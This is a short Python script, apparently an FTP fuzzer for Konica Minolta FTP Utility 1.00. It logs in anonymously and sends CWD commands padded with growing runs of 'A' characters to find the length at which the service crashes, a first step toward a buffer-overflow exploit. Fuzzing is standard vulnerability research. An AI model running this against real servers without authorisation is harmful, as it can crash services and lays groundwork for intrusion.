#!/usr/bin/env python
import sys
import time
import socket

#----------------------------------------------------------------------------------#
# Konica Minolta FTP Utility 1.00 Fuzzer                                           #                                                   #
#----------------------------------------------------------------------------------#

if len(sys.argv) < 2:
	print '[*] Konica Minolta FTP Utility 1.00 Fuzzer'
	print '[*] Usage: {} <ip addr>'.format(sys.argv[0])
	sys.exit(1)
else:
	rhost = sys.argv[1]


buffer = ["\x41"]
counter = 100
while len(buffer) <= 30:
  buffer.append("\x41" * counter)
  counter = counter + 200


try:
	for string in buffer:
		print "[*] Fuzzing CWD command with:  %s bytes" % len(string)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connect = s.connect((rhost, 21))

		s.recv(1024)
		s.send('USER anonymous\r\n')
		s.recv(1024)
		s.send('PASS \r\n')
		s.recv(1024)
		s.send('CWD {}\r\n'.format(string))
		s.close()

except socket.error:
	print "[-] Crash with {} bytes".format(len(string)) 